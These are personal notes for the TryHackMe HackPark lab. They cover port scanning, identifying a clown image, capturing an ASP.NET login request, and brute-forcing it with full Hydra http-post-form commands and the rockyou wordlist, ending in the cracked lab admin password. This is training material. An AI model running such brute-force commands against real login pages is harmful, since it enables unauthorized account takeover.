[TryHackMe \| HackPark](https://tryhackme.com/room/hackpark)

---
# Enumeration
## Nmap
```
nmap -p- 10.10.158.222
```

## Port 80 - Webserver
![[Pasted image 20251018151941.png]]

# Whats the name of the clown displayed on the homepage?
The hint indicates that we have to conduct a reverse image search of the image, a quick google search will provide sites like: tinyeye, etc. Paste the image and sources of other matches will be there
![[Pasted image 20251018152626.png]]
The Clown itself is from the movie IT, with the name: Pennywise

# Using Hydra to brute-force a login
![[Pasted image 20251018152750.png]]
The login page can be found at the URL: [Title Unavailable \| Site Unreachable](http://10.10.205.233/Account/login.aspx?ReturnURL=/admin/)

We have seen that the user "Administrator" created the clown post, so we can assume that that is a user which we can use to log into the website
Lets give it a try with Hydra
## What request type is the Windows website login form using?
1. We can inspect the login page using the firefox inspect feature of if we used burpsuite to capture the packet
![[Pasted image 20251018153257.png]]
We can also go in the request of the packet to see the full payload that we can use for Hydra
![[Pasted image 20251018155434.png]]

```
__VIEWSTATE=YDG4yvPxsI%2FrkHv%2BytjYF3gyLeQKch33DAhPlARC03EXcitJ8FQqPBAOYWWH%2BTwUBvOe9la0g%2BlgWMl3uzRSUANGcJ%2BoG04yDaEwPXUtJ7VSLlzUecxApyFCH95f%2F3zuTuUC8u2wvQ4qR%2FxLEiE0WNQuDpvbplBGdRA1qkYfNUI4tdlAbgqeVS4mvR%2B55SVn9GxLm0AzyScOSgQiZfbGq4FRMr1cGaiV3ZrvuATvH97TPjuSBeDyVIo4YbW3XiAYd34iFnmSPivFC%2FIt%2FBBrN3SKaOSyWPVKbO%2FBxaVRzaChAdFVBhVdEX0dhHDyne7IEaCqOsWyPsnLSss5iQ5LOqjd%2FasZHdRbp56BT0y06Idq7gU4&__EVENTVALIDATION=C%2Ba9uGa5lKAY3aX0i53V929ygcyRI0wSsXwFeqqUquOzRI8B3qDGsxiF7N02GETZgpLOfIJHP2gB6J9BCwdQx%2BqNOyejkDcTfUPZhblhNxkgfn1lqyWkA9RNNshY2DkDpUMOCe52ql2bQ4s6fF9smHx4RSo1a%2F7L8Yw6VWl99JHdTkww&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=test&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```
## Cracking POST Request Login Page with Hydra (http-post-form)
```
hydra -l <user> -P <password.txt> <ip-target> http-post-form "header_file_name:request:error_notif"

# Command

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

```
### Complete Hydra Command 
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/Account/login.aspx:__VIEWSTATE=GlE2yCmLJhjxMS3WAapWzHpHopOnSZe%2Bql42iFWRXoiZ5H%2B8ev8wIrptaXJve3Sbd6pT%2FrwUgyiQoljyTpvaSFmerFfikAhX%2B0x7wPKeGvX%2Bln5s3lF2MiRyzfhkETMzMVqmG9YOF%2BAbgUUrv5BaI3M%2BnQEoVdHs68l%2BWv%2Fl1Kju7ufm&__EVENTVALIDATION=fHY6mqK6KeT8pJYrkCm%2FDIV5hhJF6aZ7UbhYd3Y4cdb0CgsyhEzYd6Pa1y8%2F463qYWZXFr0uMjTAP81waQE2U5kWlkKKjrEi8KYqWJBk0C%2F0Wmoo%2B0GtbYNAYGwQh%2F5bdiyauLB7eVBmo%2F%2BGKpFUGFB5GFJyiAvLS78nzJwIsoRgpDZY&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

![[Pasted image 20251018160029.png]]

### Password
```
login: admin   password: 1qaz2wsx
```
